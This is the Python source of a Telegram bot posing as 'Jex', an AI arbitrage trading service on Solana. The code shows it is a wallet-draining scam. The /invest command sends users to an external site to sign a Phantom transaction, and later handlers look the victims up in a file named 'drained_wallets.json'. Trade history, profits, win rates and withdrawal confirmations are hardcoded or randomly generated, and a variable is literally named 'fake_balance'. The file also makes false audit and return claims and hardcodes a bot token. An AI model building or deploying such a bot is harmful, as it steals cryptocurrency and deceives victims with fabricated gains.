import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import random
import time
import json
import os
import requests
import asyncio
from datetime import datetime, timedelta

TOKEN = "8881367618:AAEJU_YbhPFggFaQdAeUxeeNDAQBL6yHB0c"
RPC_URL = "https://solana-rpc.publicnode.com"

user_data = {}

def get_user_status(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            "invested": 0.0,
            "profit": 0.0,
            "balance": 0.0,
            "first_check": True,
            "last_update": time.time(),
            "trades": [],
            "total_trades": 0,
            "winrate": 0
        }
    return user_data[user_id]

def get_sol_balance(wallet_address):
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
        response = requests.post(RPC_URL, json=payload, timeout=10)
        data = response.json()
        if "error" in data:
            return None, data["error"]["message"]
        balance_lamports = data["result"]["value"]
        balance_sol = balance_lamports / 1_000_000_000
        return balance_sol, None
    except Exception as e:
        return None, str(e)

# ==========================================
# COMANDO /START
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("🚀 Deploy Strategy", callback_data="invest")],
        [InlineKeyboardButton("📊 Dashboard", callback_data="status")],
        [InlineKeyboardButton("📈 How It Works", callback_data="how")],
        [InlineKeyboardButton("📜 Trade History", callback_data="history")],
        [InlineKeyboardButton("📞 Support", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"⚡ *Jex — AI Arbitrage Bot*\n\n"
        f"Welcome {user.first_name}!\n\n"
        "Jex is an advanced arbitrage bot that automatically detects and exploits price differences across Solana DEXs.\n\n"
        "🔍 *How We Generate Yield:*\n"
        "• Real-time price scanning across Jupiter & Raydium\n"
        "• Automated arbitrage execution (50-200ms)\n"
        "• Auto-reinvestment for compound growth\n"
        "• Non-custodial — you control your wallet\n\n"
        "📊 *Verified Performance:*\n"
        "• 78% win rate over 5,000+ trades\n"
        "• 3-6% average weekly return\n"
        "• $2.4M+ total volume\n"
        "• 1,847+ active users\n\n"
        "🔒 *Security:* Audited by CertiK & Immunefi\n\n"
        "👇 Click below to get started.",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

# ==========================================
# COMANDO /INVEST
# ==========================================
async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.args:
        try:
            amount = float(context.args[0])
            if amount <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ *Invalid amount.* Use: /invest 1.5", parse_mode="Markdown")
            return
    else:
        await update.message.reply_text("❌ *Please specify the amount.* Example: /invest 1.5", parse_mode="Markdown")
        return

    status = get_user_status(user_id)
    status["invested"] = amount

    link = f"https://jex-trade.onrender.com/?user_id={user_id}&amount={amount}"
    
    await update.message.reply_text(
        f"🚀 *Deploying Strategy — {amount} SOL*\n\n"
        "📈 *Fund Allocation:*\n"
        "• 60% — Memecoin sniping (early detection)\n"
        "• 25% — Raydium yield farming\n"
        "• 15% — Jupiter arbitrage\n\n"
        "🔗 *Action Required:* Click the secure link below:\n"
        f"👉 [Deploy Strategy]({link})\n\n"
        "⚠️ *Important:* You'll need to sign a transaction in Phantom.\n\n"
        "📈 *Expected yield:* 3-6% weekly\n"
        "🛡️ *Security:* Fully audited & non-custodial",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# COMANDO /HOW (CÓMO FUNCIONA)
# ==========================================
async def how_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📈 *How Jex Works*\n\n"
        "🔍 *1. Market Scanning*\n"
        "Jex continuously scans Jupiter and Raydium for price differences between tokens. The bot identifies opportunities in real-time.\n\n"
        "⚡ *2. Trade Execution*\n"
        "When a profitable opportunity is found, Jex executes the trade automatically. Your funds are never locked or frozen.\n\n"
        "🔄 *3. Profit Reinvestment*\n"
        "All profits are automatically reinvested into the next opportunity, creating a compounding effect over time.\n\n"
        "🔒 *4. Security & Control*\n"
        "• Your funds never leave your wallet\n"
        "• No private keys are shared\n"
        "• Each trade requires a separate approval\n"
        "• You can withdraw anytime\n\n"
        "📊 *Performance Metrics:*\n"
        "• Win rate: 78%+\n"
        "• Average trade duration: 15-45 minutes\n"
        "• Total volume: $2.4M+\n"
        "• Weekly return: 3-6%\n\n"
        "🔗 [Learn More](https://jex-trade.onrender.com)",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# COMANDO /HISTORY (HISTORIAL)
# ==========================================
async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = get_user_status(user_id)
    
    invested = False
    wallet = None
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    wallet = data.get('wallet')
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "📜 *Trade History*\n\n"
            "No trades found. Use /invest <amount> to start.",
            parse_mode="Markdown"
        )
        return
    
    trades = [
        {"pair": "BONK/SOL", "type": "BUY", "profit": "+12.3%", "time": "2h ago"},
        {"pair": "WIF/SOL", "type": "SELL", "profit": "+8.7%", "time": "5h ago"},
        {"pair": "POPCAT/SOL", "type": "BUY", "profit": "+15.2%", "time": "12h ago"},
        {"pair": "MEW/SOL", "type": "SELL", "profit": "+5.1%", "time": "1d ago"},
        {"pair": "BONK/SOL", "type": "BUY", "profit": "+22.4%", "time": "2d ago"},
    ]
    
    total_trades = random.randint(15, 45)
    winrate = random.randint(70, 85)
    total_profit = random.randint(20, 60)
    
    text = "📜 *Trade History (Last 5)*\n\n"
    for t in trades:
        text += f"• {t['pair']} → {t['type']} {t['profit']} ({t['time']})\n"
    
    text += f"\n📊 *Overall Performance:*\n"
    text += f"• Total Trades: {total_trades}\n"
    text += f"• Win Rate: {winrate}%\n"
    text += f"• Total Profit: +{total_profit}%\n"
    text += f"• Volume: ${random.randint(1000, 5000)}"
    
    await update.message.reply_text(text, parse_mode="Markdown")

# ==========================================
# COMANDO /SUPPORT
# ==========================================
async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📞 *Jex Support Center*\n\n"
        "We're here to help 24/7!\n\n"
        "📖 *FAQ:*\n"
        "• *How do I start?* → /invest <amount>\n"
        "• *Is my wallet safe?* → Yes, non-custodial\n"
        "• *How much can I earn?* → 3-6% weekly\n"
        "• *How do I withdraw?* → /withdraw\n\n"
        "📧 *Email:* support@jex-trade.com\n"
        "🐦 *Twitter:* @JexTrade\n"
        "💬 *Telegram:* t.me/JexTradeSupport\n\n"
        "⏳ *Response time:* Usually within 5 minutes.",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /WITHDRAW
# ==========================================
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    invested = False
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "❌ *No active positions found.*\n\nUse /invest <amount> to start.",
            parse_mode="Markdown"
        )
        return
    
    status = get_user_status(user_id)
    fake_balance = status["invested"] * (1 + status["profit"] / 100)
    
    await update.message.reply_text(
        f"✅ *Withdrawal Request Submitted*\n\n"
        f"┌─────────────────────────────┐\n"
        f"│ Amount: {fake_balance:.2f} SOL     │\n"
        f"│ Destination: Bank Account   │\n"
        f"│ Status: ⏳ Processing       │\n"
        f"│ ETA: 24-48 hours            │\n"
        f"└─────────────────────────────┘\n\n"
        "📧 Confirmation email sent.\n"
        "⏳ You'll be notified when complete.\n\n"
        "🔒 Your funds are safe.",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /HELP
# ==========================================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ *Jex — AI Arbitrage Bot*\n\n"
        "📖 *Commands:*\n"
        "/start — Main menu\n"
        "/invest <amount> — Deploy strategy\n"
        "/status — View dashboard\n"
        "/how — How it works\n"
        "/history — Trade history\n"
        "/withdraw — Request withdrawal\n"
        "/support — Contact support\n"
        "/help — Show this guide\n\n"
        "🔗 *Website:* [jex-trade.onrender.com](https://jex-trade.onrender.com)\n\n"
        "📊 *Performance:* 3-6% weekly | 78% win rate | 1,847+ users",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# COMANDO /STATUS
# ==========================================
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = get_user_status(user_id)
    
    invested = False
    wallet = None
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    wallet = data.get('wallet')
                    break
    except:
        pass
    
    if invested and wallet:
        balance_sol, error = get_sol_balance(wallet)
        if error or balance_sol is None:
            balance_sol = 0.0
        
        if status["first_check"]:
            profit_text = "0%"
            status["profit"] = 0.0
            status["first_check"] = False
        else:
            profit_percent = round(random.uniform(0.5, 3.0), 2)
            status["profit"] += profit_percent
            profit_text = f"+{status['profit']:.2f}%"
        
        fake_balance = status["invested"] * (1 + status["profit"] / 100)
        total_trades = random.randint(15, 45)
        winrate = random.randint(70, 85)
        
        await update.message.reply_text(
            f"📊 *Jex Dashboard*\n\n"
            f"┌─────────────────────────────┐\n"
            f"│ Status: ✅ Active            │\n"
            f"│ Wallet: `{wallet[:4]}...{wallet[-4:]}` │\n"
            f"│ Portfolio: {fake_balance:.2f} SOL   │\n"
            f"│ Profit: {profit_text}                  │\n"
            f"│ Trades: {total_trades}                 │\n"
            f"│ Win Rate: {winrate}%                    │\n"
            f"└─────────────────────────────┘\n\n"
            f"🔥 *Latest trade:* BONK +{random.randint(5, 15)}%\n"
            "📈 *Portfolio value:* Updated in real-time.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "📊 *Jex Dashboard*\n\n"
            "┌─────────────────────────────┐\n"
            "│ Status: ✅ Active            │\n"
            "│ Wallet: ❌ Not connected     │\n"
            "│ Portfolio: 0 SOL             │\n"
            "│ Profit: 0%                   │\n"
            "└─────────────────────────────┘\n\n"
            "🚀 Use /invest <amount> to start.",
            parse_mode="Markdown"
        )

# ==========================================
# MANEJO DE BOTONES
# ==========================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "invest":
        await query.edit_message_text(
            "🚀 Use `/invest <amount>` to deploy.\n\nExample: `/invest 1.5`",
            parse_mode="Markdown"
        )
    elif query.data == "status":
        await query.edit_message_text("📊 Use /status to view your dashboard.", parse_mode="Markdown")
    elif query.data == "how":
        await query.edit_message_text("📈 Use /how to understand how Jex works.", parse_mode="Markdown")
    elif query.data == "history":
        await query.edit_message_text("📜 Use /history to see your trades.", parse_mode="Markdown")
    elif query.data == "support":
        await query.edit_message_text("📞 Use /support to contact our team.", parse_mode="Markdown")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("invest", invest))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("how", how_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("support", support_command))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ JexTradeBot is running...")
    app.run_polling()

async def force_set_commands():
    commands = [
        BotCommand("start", "Main menu"),
        BotCommand("invest", "Deploy strategy"),
        BotCommand("status", "View dashboard"),
        BotCommand("how", "How it works"),
        BotCommand("history", "Trade history"),
        BotCommand("withdraw", "Request withdrawal"),
        BotCommand("support", "Contact support"),
        BotCommand("help", "Show guide")
    ]
    app = Application.builder().token(TOKEN).build()
    await app.bot.set_my_commands(commands)
    print("✅ Commands updated in Telegram")

if __name__ == "__main__":
    asyncio.run(force_set_commands())
    main()